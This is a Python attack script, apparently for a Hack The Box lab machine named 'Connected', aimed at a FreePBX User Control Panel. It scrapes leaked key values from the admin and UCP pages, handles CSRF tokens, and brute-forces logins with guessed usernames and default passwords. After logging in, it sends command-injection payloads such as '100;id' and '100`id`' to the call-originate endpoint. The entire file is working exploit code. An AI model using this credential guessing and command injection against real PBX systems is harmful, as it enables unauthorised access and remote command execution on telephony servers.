#!/usr/bin/env python3
"""UCP login (User/login) + Home/originate probe — Connected HTB."""
import re
import sys
import requests

IP = "10.129.245.100"
BASE = f"http://{IP}/ucp/"
HOST = "connected.htb"

s = requests.Session()
s.headers.update({
    "Host": HOST,
    "Referer": f"http://{HOST}/ucp/",
    "Origin": f"http://{HOST}",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) Chrome/134.0.0.0",
})


def get_token() -> str:
    r = s.get(BASE, timeout=120)
    m = re.search(r'name="token" value="([^"]+)"', r.text)
    if not m:
        raise SystemExit("no CSRF token")
    return m.group(1)


def try_login(user: str, password: str) -> dict:
    tok = get_token()
    data = {
        "token": tok,
        "username": user,
        "password": password,
        "rememberme": "on",
        "module": "User",
        "command": "login",
        "display": "dashboard",
    }
    r = s.post(BASE, data=data, timeout=120)
    try:
        j = r.json()
    except Exception:
        j = {"raw": r.text[:300], "status": "not_json", "has_login": "frm-login" in r.text}
    return j


def logged_in() -> bool:
    r = s.get(BASE, timeout=120)
    return "frm-login" not in r.text and ("logout" in r.text.lower() or "dashboard" in r.text.lower())


def originate(from_ext: str, to_ext: str) -> dict:
    data = {
        "quietmode": "1",
        "module": "Home",
        "command": "originate",
        "from": from_ext,
        "to": to_ext,
    }
    r = s.post(f"http://{IP}/ucp/ajax.php", data=data, timeout=60)
    try:
        return r.json()
    except Exception:
        return {"raw": r.text[:500]}


def main():
    ucp_html = s.get(BASE, timeout=60).text
    admin_html = requests.get(
        f"http://{IP}/admin/",
        headers={"Host": HOST, "Referer": f"http://{HOST}/admin/"},
        timeout=60,
    ).text
    key_admin = re.search(r'id="key"[^>]*>\s*([a-z0-9]+)', admin_html)
    extra = re.search(r'extra-info pull-left">([^<]+)<', ucp_html)
    A = key_admin.group(1).strip() if key_admin else ""
    B = extra.group(1).strip() if extra else ""
    print(f"[*] leaks admin-key={A[:8]}... ucp-extra={B[:8]}...")

    users = [
        "FreePBXUCPTemplateCreator",
        B,
        A,
        "FreePBX-Template",
        "ucptemplate",
        "template",
        "admin",
        "ucp",
        "pbxconnect",
        "freepbx",
        "user",
        "100",
        "1001",
    ]
    passes = [B, A, f"{B}{A}", f"{A}{B}", "admin", "password", "freepbx"]
    users = list(dict.fromkeys(u for u in users if u))
    passes = list(dict.fromkeys(p for p in passes if p))

    hit = None
    for u in users:
        for p in passes:
            if u == p and len(users) > 2:
                continue
            j = try_login(u, p)
            if j.get("status") is True or logged_in():
                print(f"[+] LOGIN OK {u}:{p} -> {j}")
                hit = (u, p)
                break
            msg = j.get("message", j.get("error", ""))
            if msg and "declined" not in str(msg).lower():
                print(f"[-] {u}:{p} -> {msg}")
        if hit:
            break

    if not hit and not logged_in():
        print("[!] no login hit")
        return 1

    print("[*] session check:", logged_in())
    for payload_from, payload_to in [
        ("100", "100"),
        ("100", "100;id"),
        ("100`id`", "100"),
    ]:
        print(f"[*] originate from={payload_from!r} to={payload_to!r}")
        print(originate(payload_from, payload_to))
    return 0


if __name__ == "__main__":
    sys.exit(main())